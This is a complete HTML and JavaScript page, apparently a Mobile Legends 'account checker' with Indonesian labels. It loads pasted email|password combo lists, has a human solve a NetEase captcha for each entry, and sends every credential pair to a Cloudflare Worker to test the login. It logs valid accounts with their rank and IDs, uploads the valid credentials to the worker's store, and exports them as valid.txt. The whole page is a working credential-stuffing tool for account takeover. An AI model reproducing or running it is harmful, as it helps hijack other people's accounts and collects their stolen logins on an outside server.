<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<title>MLBB Checker Manual Captcha</title>
<script src="https://cstaticdun.126.net/load.min.js"></script>
<style>
  body { font-family: Arial; max-width: 900px; margin: auto; padding: 20px; background: #121212; color: #eee; }
  textarea { width: 100%; height: 180px; font-family: monospace; background: #1e1e1e; color: #eee; border: 1px solid #333; }
  #captcha-root { margin: 12px 0; }
  #log { background: #000; color: #eee; height: 300px; overflow-y: auto; padding: 10px; font-family: monospace; white-space: pre-wrap; border: 1px solid #333; }
  button { padding: 10px 16px; cursor: pointer; margin-right: 8px; border: none; border-radius: 4px; }
  button:hover { opacity: 0.9; }
  #startBtn { background: #4caf50; color: white; }
  #stopBtn { background: #f44336; color: white; }
  #downloadBtn { background: #2196f3; color: white; }
  .ok { color: #7CFC00; }
  .bad { color: #FF6B6B; }
  .info { color: #FFD866; }
</style>
</head>
<body>

<h2>MLBB Checker Manual Captcha</h2>
<p>Paste list akun (email|password per baris). Untuk tiap akun akan muncul CAPTCHA manual. Hasil langsung muncul di log.</p>

<textarea id="combo" placeholder="user1@example.com|Pass123&#10;user2@example.com:Pass456"></textarea>
<br>
<button id="startBtn">Start Checking</button>
<button id="stopBtn" disabled>Stop</button>
<button id="downloadBtn">Download valid.txt</button>
<button id="loadValidBtn">Load Saved Valid</button>
<div id="status" style="margin-top:10px;"></div>

<div id="captcha-root"></div>
<h3>Log:</h3>
<div id="log"></div>

<script>
const CAPTCHA_ID = "fef5c67c39074e9d845f4bf579cc07af"; 
const WORKER_URL = "https://mlchecker.bonar7527.workers.dev"; // Ganti sesuai URL Worker

let combos = [];
let currentIndex = 0;
let stopRequested = false;
let neCaptchaInstance = null;
let validResults = []; // hasil valid

const logEl = document.getElementById("log");
const statusEl = document.getElementById("status");
const startBtn = document.getElementById("startBtn");
const stopBtn = document.getElementById("stopBtn");
const downloadBtn = document.getElementById("downloadBtn");
const loadValidBtn = document.getElementById("loadValidBtn");

function appendLog(text, cls) {
  const time = new Date().toLocaleTimeString();
  const div = document.createElement("div");
  div.textContent = `[${time}] ${text}`;
  if(cls) div.className = cls;
  logEl.appendChild(div);
  logEl.scrollTop = logEl.scrollHeight;
}

function parseCombos(text) {
  return text.split(/\r?\n/).map(l => l.trim()).filter(Boolean).map(line => {
    if(line.includes("|")) {
      const [e,p] = line.split("|",2);
      return { email: e.trim(), password: p.trim() };
    } else if(line.includes(":")) {
      const [e,p] = line.split(":",2);
      return { email: e.trim(), password: p.trim() };
    } else {
      appendLog(`Format salah dan dilewati: ${line}`, "info");
      return null;
    }
  }).filter(Boolean);
}

function showCaptchaOnce() {
  return new Promise((resolve, reject) => {
    const root = document.getElementById("captcha-root");
    root.innerHTML = "";
    if(!window.initNECaptcha) {
      appendLog("initNECaptcha tidak tersedia", "info");
      reject("initNECaptcha missing");
      return;
    }
    if(neCaptchaInstance && typeof neCaptchaInstance.destroy === "function") {
      neCaptchaInstance.destroy();
      neCaptchaInstance = null;
    }
    try {
      initNECaptcha({
        captchaId: CAPTCHA_ID,
        element: "#captcha-root",
        mode: "embed",
        width: "320px",
        onVerify(err, data) {
          if(err) {
            appendLog("Error saat verify captcha: " + JSON.stringify(err), "info");
            reject(err);
            return;
          }
          if(!data || !data.validate) {
            appendLog("Token captcha kosong", "info");
            reject("no token");
            return;
          }
          const token = data.validate;
          if(neCaptchaInstance && typeof neCaptchaInstance.destroy === "function") {
            neCaptchaInstance.destroy();
            neCaptchaInstance = null;
          }
          resolve(token);
        },
        onLoad(instance) {
          neCaptchaInstance = instance;
        }
      });
    } catch(e) {
      appendLog("Gagal inisialisasi captcha: " + e, "info");
      reject(e);
    }
  });
}

async function checkOneAccount(account) {
  appendLog(`Minta captcha untuk ${account.email}`, "info");
  statusEl.textContent = `Checking ${currentIndex+1}/${combos.length}: ${account.email}`;
  let token;
  try {
    token = await showCaptchaOnce();
  } catch(e) {
    appendLog(`Captcha gagal untuk ${account.email}: ${e}`, "bad");
    return;
  }

  appendLog(`Token captcha diterima`, "info");
  try {
    const form = new URLSearchParams();
    form.append("email", account.email);
    form.append("password", account.password);
    form.append("e_captcha", token);

    const resp = await fetch(WORKER_URL + "/check", {
      method: "POST",
      body: form,
      headers: { "Content-Type": "application/x-www-form-urlencoded" }
    });

    if(!resp.ok) {
      appendLog(`HTTP error ${resp.status} untuk ${account.email}`, "bad");
      return;
    }
    const data = await resp.json();

    if(data.code === 0 && data.data) {
      const info = data.data;
      const line = `${info.email}:${info.password} | Name: ${info.name} | Level: ${info.level} | Rank: ${info.rank_level} | RoleID: ${info.roleId} | ZoneID: ${info.zoneId} | Country: ${info.reg_country}`;
      appendLog(`VALID => ${line}`, "ok");

      validResults.push(line);

      // kirim ke KV
      try {
        await fetch(WORKER_URL + "/save-valid", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ account: line })
        });
      } catch (err) {
        appendLog(`Gagal simpan ke KV: ${err}`, "info");
      }

    } else if(data.code === 1004) {
      appendLog(`[NOT FOUND] ${account.email} - Error_NoAccount`, "bad");
    } else if(data.code === 1005) {
      appendLog(`[WRONG PASSWORD] ${account.email} - Error_PasswdError`, "bad");
    } else {
      appendLog(`LAINNYA => ${account.email} | ${JSON.stringify(data)}`, "info");
    }

  } catch(e) {
    appendLog(`Error pengecekan ${account.email}: ${e}`, "bad");
  }
}

async function startProcess() {
  stopRequested = false;
  startBtn.disabled = true;
  stopBtn.disabled = false;
  logEl.innerHTML = "";
  validResults = [];
  combos = parseCombos(document.getElementById("combo").value);

  if(combos.length === 0) {
    appendLog("Tidak ada akun untuk dicek", "info");
    startBtn.disabled = false;
    stopBtn.disabled = true;
    return;
  }

  appendLog(`Mulai cek ${combos.length} akun. Klik CAPTCHA tiap akun.`, "info");
  currentIndex = 0;

  while(currentIndex < combos.length) {
    if(stopRequested) {
      appendLog("Proses dihentikan user", "info");
      break;
    }
    const acc = combos[currentIndex];
    await checkOneAccount(acc);
    combos.splice(currentIndex, 1);
  }

  appendLog("Selesai", "info");
  statusEl.textContent = "Selesai";
  startBtn.disabled = false;
  stopBtn.disabled = true;
}

startBtn.addEventListener("click", startProcess);
stopBtn.addEventListener("click", () => {
  stopRequested = true;
  stopBtn.disabled = true;
});
downloadBtn.addEventListener("click", () => {
  if (validResults.length === 0) {
    alert("Belum ada akun valid.");
    return;
  }
  const blob = new Blob([validResults.join("\n")], { type: "text/plain" });
  const url = URL.createObjectURL(blob);
  const a = document.createElement("a");
  a.href = url;
  a.download = "valid.txt";
  a.click();
  URL.revokeObjectURL(url);
});
loadValidBtn.addEventListener("click", async () => {
  try {
    const resp = await fetch(WORKER_URL + "/valid.txt");
    if (!resp.ok) throw new Error("HTTP " + resp.status);
    const text = await resp.text();
    appendLog("=== Valid.txt dari server ===\n" + (text || "(kosong)"), "ok");
  } catch (err) {
    appendLog("Gagal load valid.txt: " + err, "bad");
  }
});
</script>
</body>
</html>
